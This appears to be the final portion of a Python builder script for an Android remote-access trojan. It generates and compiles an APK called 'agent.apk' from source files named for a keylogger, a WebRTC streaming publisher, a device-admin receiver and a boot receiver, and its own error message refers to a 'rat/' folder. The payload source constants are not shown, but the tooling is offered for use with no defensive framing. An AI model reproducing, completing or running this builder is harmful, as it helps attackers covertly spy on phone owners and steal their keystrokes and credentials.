    main = app / "src" / "main"
    write(main / "AndroidManifest.xml", MANIFEST)
    java = main / "java" / Path(PACKAGE_NAME.replace(".", "/"))
    write(java / "MainActivity.java", MAIN_ACTIVITY)
    write(java / "AgentService.java", AGENT_SERVICE)
    write(java / "WebRtcPublisher.java", WEBRTC_PUBLISHER)
    write(java / "Keylogger.java", KEYLOGGER)
    write(java / "AdminReceiver.java", ADMIN_RECEIVER)
    write(java / "BootReceiver.java", BOOT_RECEIVER)
    res = main / "res"
    write(res / "values" / "strings.xml", STRINGS_XML)
    write(res / "xml" / "admin.xml", ADMIN_XML)
    write(res / "xml" / "acc.xml", ACC_XML)
    # placeholder resources
    (res / "mipmap-hdpi").mkdir(parents=True, exist_ok=True)
    (res / "mipmap-mdpi").mkdir(parents=True, exist_ok=True)
    (res / "mipmap-xhdpi").mkdir(parents=True, exist_ok=True)
    (res / "mipmap-xxhdpi").mkdir(parents=True, exist_ok=True)
    (res / "mipmap-xxxhdpi").mkdir(parents=True, exist_ok=True)
    print("[+] sources generated at", base)

# ============================================================
# BUILD
# ============================================================
def build():
    print("[*] building agent.apk ...")
    OUTPUT_DIR.mkdir(exist_ok=True)
    with tempfile.TemporaryDirectory() as tmp:
        tmp_path = Path(tmp)
        generate_sources(tmp_path)
        # copy gradlew dari project lain
        gradlew_src = ROOT / "gradlew"
        gradlew_bat = ROOT / "gradlew.bat"
        wrapper_jar = ROOT / "gradle" / "wrapper" / "gradle-wrapper.jar"
        if gradlew_src.exists():
            shutil.copy(gradlew_src, tmp_path / "gradlew")
        if gradlew_bat.exists():
            shutil.copy(gradlew_bat, tmp_path / "gradlew.bat")
        if wrapper_jar.exists():
            (tmp_path / "gradle" / "wrapper").mkdir(parents=True, exist_ok=True)
            shutil.copy(wrapper_jar, tmp_path / "gradle" / "wrapper" / "gradle-wrapper.jar")

        # copy assets
        assets_src = ROOT / "assets"
        if assets_src.exists():
            for f in assets_src.glob("*.png"):
                for d in (tmp_path / "app" / "src" / "main" / "res").glob("mipmap-*"):
                    shutil.copy(f, d / "ic_launcher.png")

        gradlew = tmp_path / "gradlew.bat" if os.name == "nt" else tmp_path / "gradlew"
        if not gradlew.exists():
            print("[!] gradlew not found in rat/. run: gradle wrapper --gradle-version 8.9")
            return
        cmd = [str(gradlew), "assembleRelease", "--no-daemon"]
        r = subprocess.run(cmd, cwd=tmp_path)
        if r.returncode != 0:
            print("[!] build failed")
            return
        apk = tmp_path / "app" / "build" / "outputs" / "apk" / "release" / "app-release-unsigned.apk"
        if not apk.exists():
            print("[!] apk not found")
            return
        out = OUTPUT_DIR / "agent.apk"
        shutil.copy(apk, out)
        print("[+] built:", out)

# ============================================================
# CLI
# ============================================================
def main():
    p = argparse.ArgumentParser()
    p.add_argument("action", choices=["build", "gen", "clean"])
    args = p.parse_args()
    if args.action == "gen":
        generate_sources(ROOT / "agent_src")
    elif args.action == "build":
        build()
    elif args.action == "clean":
        if (ROOT / "agent_src").exists():
            shutil.rmtree(ROOT / "agent_src")
        print("[+] cleaned")

if __name__ == "__main__":
    main()